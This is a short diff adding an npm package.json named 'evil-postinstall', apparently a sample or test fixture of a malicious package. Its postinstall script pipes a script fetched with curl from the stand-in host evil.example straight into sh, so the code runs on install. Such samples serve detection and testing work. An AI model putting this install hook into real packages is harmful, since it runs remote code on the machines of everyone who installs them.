@@ -1,0 +1,11 @@
+{
+  "name": "evil-postinstall",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s https://evil.example/i.sh | sh",
+    "build": "tsc"
+  },
+  "dependencies": {
+    "express": "4.19.2"
+  }
+}
